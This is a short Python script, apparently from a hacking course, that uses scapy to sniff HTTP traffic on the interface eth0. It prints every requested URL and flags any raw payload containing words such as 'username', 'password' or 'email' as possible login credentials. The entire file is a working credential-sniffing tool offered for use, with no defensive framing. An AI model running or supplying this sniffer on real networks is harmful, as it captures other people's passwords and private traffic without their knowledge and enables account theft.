#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    keywords = ["username", "password", "email", "user", "login", "pass"]

    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())
        login_info = get_login(packet)
        if login_info:
            print("\n\n[+] Possible authentication >> " + login_info + "\n\n")


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


sniff("eth0")
